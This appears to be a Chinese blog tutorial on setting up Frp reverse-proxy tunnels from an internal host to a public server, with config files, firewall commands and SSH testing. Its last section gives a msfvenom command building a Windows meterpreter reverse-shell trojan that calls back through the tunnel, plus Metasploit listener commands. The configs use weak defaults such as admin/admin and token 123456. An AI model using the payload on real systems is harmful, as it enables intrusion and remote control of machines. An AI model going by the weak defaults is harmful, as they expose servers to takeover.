# 原创
：  【内网安全-隧道搭建】内网穿透_Frp上线、测试

# 【内网安全-隧道搭建】内网穿透_Frp上线、测试

**目录**

[Frp（简易上线）](#Frp%EF%BC%88%E7%AE%80%E6%98%93%E4%B8%8A%E7%BA%BF%EF%BC%89)

[1、简述：](#1%E3%80%81%E7%AE%80%E8%BF%B0%EF%BC%9A)

[2、工具：](#2%E3%80%81%E5%B7%A5%E5%85%B7%EF%BC%9A)

[3、使用：](#3%E3%80%81%E4%BD%BF%E7%94%A8%EF%BC%9A)

[1、准备：](#1%E3%80%81%E5%87%86%E5%A4%87%EF%BC%9A)

[2、服务端（公网）：](#2%E3%80%81%E6%9C%8D%E5%8A%A1%E7%AB%AF%EF%BC%88%E5%85%AC%E7%BD%91%EF%BC%89%EF%BC%9A)

[2、客户端（内网）：](#2%E3%80%81%E5%AE%A2%E6%88%B7%E7%AB%AF%EF%BC%88%E5%86%85%E7%BD%91%EF%BC%89%EF%BC%9A)

[3、测试方法：](#3%E3%80%81%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95%EF%BC%9A)

[4、生成后门木马监听：](#4%E3%80%81%E7%94%9F%E6%88%90%E5%90%8E%E9%97%A8%E6%9C%A8%E9%A9%AC%E7%9B%91%E5%90%AC%EF%BC%9A)

---


## Frp（简易上线）

> 
<h3>1、简述：</h3>
1）Frp (Fast Reverse Proxy) 是一个免费开源的用于内网穿透的反向代理应用，它支持 TCP、UDP 协议， 也为 HTTP、HTTPS 协议提供了额外的支持。
<hr/>
2）frp：服务端（装在公网ip的服务器上）+客户端（装在内网主机上）
<hr/>
3）中转站功能：实现公网 ←→ FRP(服务器) ←→ 内网 的连接（可以将内网服务以安全、便捷的方式通过具有公网IP节点的中转暴露到公网。）
<hr/>
4）原理：
第一步：服务端：运行，并监听端口，等待客户端连接
第二步：客户端：连接服务端的端口，告诉服务端要监听的端口和转发类型
第三步：服务端：创建新的进程，监听客户端指定的端口
第四步：外网用户：连接到客户端指定的端口，服务端通过和客户端的连接将数据转发到客户端
第五步：客户端：进程将数据转发到本地服务


---


> 
<h3>2、工具：</h3>
URL：https://github.com/fatedier/frp
选择合适的版本
[Releases · fatedier/frp (github.com)<img alt="" src="https://csdnimg.cn/release/blog_editor_html/release2.2.2/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=N0U7"/>https://github.com/fatedier/frp/releases](https://github.com/fatedier/frp/releases)<img alt="" height="950" src="https://img-blog.csdnimg.cn/545577490d294b9694ae692fca57f675.png" width="1200"/>



> 
<h3>3、使用：</h3>
<h4>1、准备：</h4>
1）准备一个域名（注册一个，直接使用ip也可）
2）准备一个服务器（阿里云、腾讯云等都可以免费领一个月）
3）VM中搭建一个虚拟机（内网环境）
4）测试连通性，使用Xshell，或者准备一台非同一局域网下主机并使用ssh命令
5）下载frp工具
<pre><code>命令行输入：
wget  https://github.com/fatedier/frp/releases/download/v0.46.1/frp_0.46.1_linux_arm64.tar.gz</code></pre>
（下载太慢了，我直接下载到电脑上，然后使用xshell配套的xftp传上去）

先解压后再上传的话
1：上传到客户端上面的（即内网主机）
2：上传到服务端上面的（即公网服务器）
 <img alt="" height="248" src="https://img-blog.csdnimg.cn/ef03c7a0e93b463792b097551dd8c575.png" width="238"/>
s结尾代表server（服务端）
c结尾代表client（客户端）
——————
4）文件解压 
如果直接使用的命令下载的，就需要解压
<pre>`tar -zxvf frp_0.46.1_linux_amd64.tar.gz`</pre>
方法一：然后把服务端的文件cp出来（或删掉客户端文件）
<pre><code>sudo mkdir 创建文件夹
sudo cp 原文件的位置  将要复制到的位置 </code></pre>
方法二：直接删除客户端文件
<pre><code>rm frpc
rm frpc.ini
rm frpc_full.ini</code></pre>
解压之后文件夹改个名，方便操作
——————
5）文件添加权限（客户端、服务端）
<pre><code>cd /usr/local/frp
sudo chmod 777 frpc
（777为所有权限，也可以换为+x可执行权限，熟悉Linux的就不用多说了）
</code></pre>

<hr/>
<h4>2、服务端（公网）：</h4>
1）修改配置文件（frps.ini）
<pre><code>编辑文件内容
vim ./frps.ini</code></pre>
<pre><code>配置文件内容
[common]
bind_port = 7000         # 服务端与客户端通信端口
dashboard_port = 7500    # 后台管理端口
dashboard_user = admin   # 后台登录用户名
dashboard_pwd = admin

vhost_http_port = 7002   # http穿透端口
vhost_https_port = 7003  # https穿透端口
max_pool_count = 50

token = 123456			 # 身份验证令牌，frpc要与frps一致
tcp_mux = true

log_file = /usr/local/frp/frps.log  # 日志相关配置
log_level = info
log_max_days = 3

authentication_timeout = 0  # 服务器与客户端时间相差15min会连接失败，0表示不验证
subdomain_host = ……         # 填写自己注册的域名
privilege_mode = true</code></pre>
——————
2）访问的端口开发
（以腾讯云为例）
方法一：
直接在服务器控制台上添加规则


方法二：
Linux使用命令行添加
<pre><code># 添加监听端口
sudo firewall-cmd --permanent --add-port=7000/tcp
# 添加管理后台端口
sudo firewall-cmd --permanent --add-port=7500/tcp
sudo firewall-cmd --reload</code></pre>
方法三：
使用ufw、iptables工具

方法四：
直接关闭防火墙
——————
3）启动服务端：
<pre>`./frps -c ./frps.ini`</pre>

启动成功
——————
4）访问后台管理界面
服务器ip（或者域名）:port（7500）
并使用自己设置的用户名，密码登陆

————
扩展：
关闭窗口会停止
所以，需要后台运行
<pre>`nohup ./frps -c frps.ini &amp;`</pre>


<hr/>
<h4>2、客户端（内网）：</h4>
1）解压、保留客户端配置文件
——————
2）修改配置文件
<pre><code>编辑配置文件
vim ./frpc.ini</code></pre>
<pre><code># 客户端配置
[common]
server_addr = ……          # 公网服务器ip
server_port = 7000   	  # 公网服务端通信端口，与frps.ini的bind_port一致

token = 123456			  # 身份验证令牌，与服务端的frps.ini中token一致）
tcp_mux = true

log_file = /usr/local/frp/frpc.log	# 日志相关
log_level = info
log_max_days = 3
authentication_timeout = 0 			# 服务器与客户端时间相差15min会连接失败，0表示不验证

# 配置ssh服务
[ssh]							# 添加ssh节点 
type = tcp
local_ip = 192.168.xxx.xxx      # 或者127.0.0.1
local_port = 22
remote_port = 7001				# 指明由公网服务器的7001端口代理（ssh连接端口，远程服务端口）

# 配置http服务，可用于其他开发
[web01]							# 添加web节点
type = http
local_ip = 192.168.xxx.xxx      # 或者127.0.0.1
local_port = 8080				# 本地8080端口（自定义的tomcat服务）可以通公网服务器7002端口访问
subdomain = web01				# 自定义子域名</code></pre>
——————
3）防火墙端口开放
开放方法和服务端类似
——————
4）客户端启动
<pre>`./frpc -c frpc.ini`</pre>

<hr/>
<h4>3、测试方法：</h4>
方法一：
直接使用Xshell工具，对公网服务器进行连接（公网服务器ip）
端口设置为客户端指定的服务器代理端口（remote_port = 7001）
————
方法二：
使用不在同一局域网下的电脑
<pre><code>ssh admin@***.*.*.* -p 端口

# -p 指定服务器端口号，不指定端口则默认22，但此处修改为我们设置的ssh服务端口7001
# admin 为登录的用户名
# ***.*.*.* 为公网服务器ip/域名</code></pre>

————
注：
如果报错Connection closed by……
1、授予ssh权限
2、开启ssh服务
<hr/>
<h4>4、生成后门木马监听：</h4>
msfvenom -p windows/meterpreter/reverse_tcp lhost=公网服务器ip lport=服务端代理客户端的端口（即remote_port ） -f exe -o frp.exe<br/> use exploit/multi/handler<br/> set payload windows/meterpreter/reverse_tcp<br/> set LHOST 127.0.0.1<br/> set LPORT 5555
（注：这个监听端口lport，与本地转发端口一致）<br/> exploit



#### 1、准备：

---


#### 2、客户端（内网）：

---


#### 4、生成后门木马监听：
